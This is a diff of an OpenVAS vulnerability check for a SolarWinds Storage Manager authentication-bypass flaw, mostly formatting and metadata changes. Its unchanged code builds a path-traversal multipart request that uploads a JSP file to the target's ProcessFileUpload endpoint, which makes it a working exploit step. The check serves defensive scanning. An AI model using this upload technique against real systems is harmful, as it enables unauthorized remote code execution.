@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_solarwinds_storage_manager_authentication_bypass_09_14.nasl 8654 2018-02-05 08:19:22Z cfischer $
+# $Id: gb_solarwinds_storage_manager_authentication_bypass_09_14.nasl 10904 2018-08-10 14:24:40Z mmartin $
 #
 # SolarWinds Storage Manager AuthenticationFilter Remote Code Execution Vulnerability
 #
@@ -30,26 +30,27 @@ if (description)
  script_oid("1.3.6.1.4.1.25623.1.0.105090");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
- script_version ("$Revision: 8654 $");
+ script_version("$Revision: 10904 $");
 
  script_name("SolarWinds Storage Manager AuthenticationFilter Remote Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-299/");
- 
- script_tag(name: "impact" , value:"This may allow a remote attacker to subvert
+
+ script_tag(name:"impact", value:"This may allow a remote attacker to subvert
 the authentication filter and upload arbitrary scripts, and use them to execute
 arbitrary code.");
 
- script_tag(name: "vuldetect" , value:"Try to upload a file.");
+ script_tag(name:"vuldetect", value:"Try to upload a file.");
 
- script_tag(name: "insight" , value:"SolarWinds Storage Manager contains a flaw
+ script_tag(name:"insight", value:"SolarWinds Storage Manager contains a flaw
 in the AuthenticationFilter class.");
 
- script_tag(name: "solution" , value:"Update to 5.7.2 or higher.");
- script_tag(name: "summary" , value:"SolarWinds Storage Manager is prone to a remote code execution vulnerability");
+ script_tag(name:"solution", value:"Update to 5.7.2 or higher.");
+ script_tag(name:"solution_type", value:"VendorFix");
+ script_tag(name:"summary", value:"SolarWinds Storage Manager is prone to a remote code execution vulnerability");
 
- script_tag(name: "affected" , value:"Storage Manager Server before 5.7.2 is vulnerable;");
+ script_tag(name:"affected", value:"Storage Manager Server before 5.7.2 is vulnerable;");
 
- script_tag(name:"last_modification", value:"$Date: 2018-02-05 09:19:22 +0100 (Mon, 05 Feb 2018) $");
+ script_tag(name:"last_modification", value:"$Date: 2018-08-10 16:24:40 +0200 (Fri, 10 Aug 2018) $");
  script_tag(name:"creation_date", value:"2014-09-16 15:55:12 +0200 (Tue, 16 Sep 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
@@ -76,9 +77,9 @@ file = '_OpenVAS_.jsp';
 
 host = http_host_name(port:port);
 
-data = '\r\n' + 
-      '--_Part_316_1523688081_377140406\r\n' + 
-      'Content-Disposition: form-data; name="ljyu"; filename="' + file + '"\r\n' + 
+data = '\r\n' +
+      '--_Part_316_1523688081_377140406\r\n' +
+      'Content-Disposition: form-data; name="ljyu"; filename="' + file + '"\r\n' +
       'Content-Type: application/octet-stream\r\n' +
       '\r\n' +
       '<%@ page language="Java" import="java.util.*"%>\r\n' +
@@ -91,11 +92,11 @@ data = '\r\n' +
 len = strlen( data );
 
 req = 'POST /images/../jsp/ProcessFileUpload.jsp HTTP/1.1\r\n' +
-      'Host: ' + host + '\r\n' + 
+      'Host: ' + host + '\r\n' +
       'User-Agent: ' + OPENVAS_HTTP_USER_AGENT  + '\r\n' +
-      'Content-Type: multipart/form-data; boundary=_Part_316_1523688081_377140406\r\n' + 
+      'Content-Type: multipart/form-data; boundary=_Part_316_1523688081_377140406\r\n' +
       'Content-Length: ' + len + '\r\n' +
-      '\r\n' + 
+      '\r\n' +
       data;
 
 result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
